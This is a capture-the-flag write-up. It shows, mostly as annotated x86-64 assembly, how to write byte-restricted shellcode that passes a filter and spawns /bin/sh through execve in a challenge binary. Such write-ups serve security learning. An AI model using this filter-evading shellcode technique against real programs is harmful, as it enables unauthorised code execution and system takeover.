# Shellcoding

## Solution

The idea of this challenge is very simple, you are able to provide input that is run as shell code. The only issue is that, for each byte `b`, it must pass the following check: `b & 2 == 0` (with the exception of allowing `syscall`). Thus, the challenge is to try to execute `/bin/sh` under these circumstances.

The first challenge that we attempt is to set `rsi` to `0`. Luckily, `rsi` is already `1`, so we are very close to what we want. Because of our constraint, in order to set this variable, we run this:
```
/* rsi = 0 */
add si, 0x2
sub si, 0x3
```
Next, we need to set `rdx` to `0`. This can be trivially done by pushing `rsi` on the stack and then popping it into `rdx`:
```
/* rdx = 0 */
push rsi
pop rdx
```
Next, we need to add `/bin/sh` onto the stack. This proves to be a challenging operation. The idea to solve it is to add it to the stack two bytes at a time by moving the bytes into `bx` and pushing that on the stack. This only causes issues if a byte of `/bin/sh` fails the check. We remedy this by subtracting `2` from the byte and then running `inc` twice on it:
```
/* On stack: 0x68732f6e69622f */
push rsi
pop rbx
mov bl, 0x66
inc bl
inc bl
push bx
mov bx, 0x732f
push bx
mov bx, 0x6e67
inc bl
inc bl
push bx
mov bx, 0x622f
push bx
```
Now, we need to set `rax` to equal `0x3b`. We do this by setting `bl` to `0x3b` and exchanging `eax` with `ebx`:
```
/* rax = 0x3b */
push rsi
pop rbx
mov bl, 0x3b
xchg eax, ebx
```
Finally, we need to set `rdi` to the value of `rsp`. The solution to this is a little odd. We note that, when running in the production environment, the eleventh value on the stack is a pointer to part of the stack. So, before we add `/bin/sh` to the stack, we must populate `rdi` with the eleventh value of the stack:
```
/* Set up rdi for later */
pop rdi
pop rdi
pop rdi
pop rdi
pop rdi
pop rdi
pop rdi
pop rdi
pop rdi
pop rdi
pop rdi
```
Now, because `rdi` might be slightly off of where we need to be in the stack, we exchange `di` and `sp`. After this, we call `syscall`:
```
/* rdi = rsp */
xchg di, sp

/* syscall */
syscall
```
Sending this shellcode to the binary causes us to obtain a shell on the system.